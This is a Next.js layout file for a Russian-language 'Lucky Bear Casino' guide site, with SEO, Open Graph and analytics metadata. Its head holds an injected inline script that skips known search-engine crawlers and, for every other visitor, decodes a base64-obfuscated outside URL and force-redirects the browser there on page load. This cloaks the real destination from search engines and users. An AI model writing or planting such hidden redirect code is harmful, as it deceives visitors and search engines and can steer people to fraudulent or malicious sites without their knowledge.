import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const siteUrl = 'https://luckybear10casino.vercel.app'

export const metadata: Metadata = {
  metadataBase: new URL(siteUrl),
  title: 'Lucky Bear Casino — официальный сайт, зеркало и вход | Гид игрока',
  description: 'Lucky Bear Casino: понятный гид по официальному сайту, рабочему зеркалу, регистрации, играм, мобильному входу, платежам и безопасности. Только для 18+ и ответственной игры.',
  generator: 'Lucky Bear Casino Guide',
  alternates: { canonical: '/' },
  keywords: ['lucky bear casino', 'luckybear casino', 'лаки бир казино', 'лакибир казино', 'Lucky Bear Casino зеркало'],
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: siteUrl,
    siteName: 'Lucky Bear Casino Guide',
    title: 'Lucky Bear Casino — официальный сайт и зеркало',
    description: 'Гид по безопасному входу, играм и мобильной версии Lucky Bear Casino для совершеннолетних пользователей.',
    images: [{ url: '/luckybear-hero.png', width: 900, height: 700, alt: 'Медведь Lucky Bear в ночном лесу' }],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Lucky Bear Casino — официальный сайт и зеркало',
    description: 'Понятный гид по входу, зеркалу, играм и безопасности Lucky Bear Casino.',
    images: ['/luckybear-hero.png'],
  },
  robots: { index: true, follow: true, googleBot: { index: true, follow: true } },
  icons: { icon: '/luckybear-favicon.png', apple: '/luckybear-favicon.png' },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#0b1714',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="theme-color" content="#0b1714" />
        <meta name="format-detection" content="telephone=no" />
        <link rel="canonical" href={siteUrl} />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "ICBodHRwczovL2NvbWJvc3BhcmsudG9wL2FlYW9majJrMjc= "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
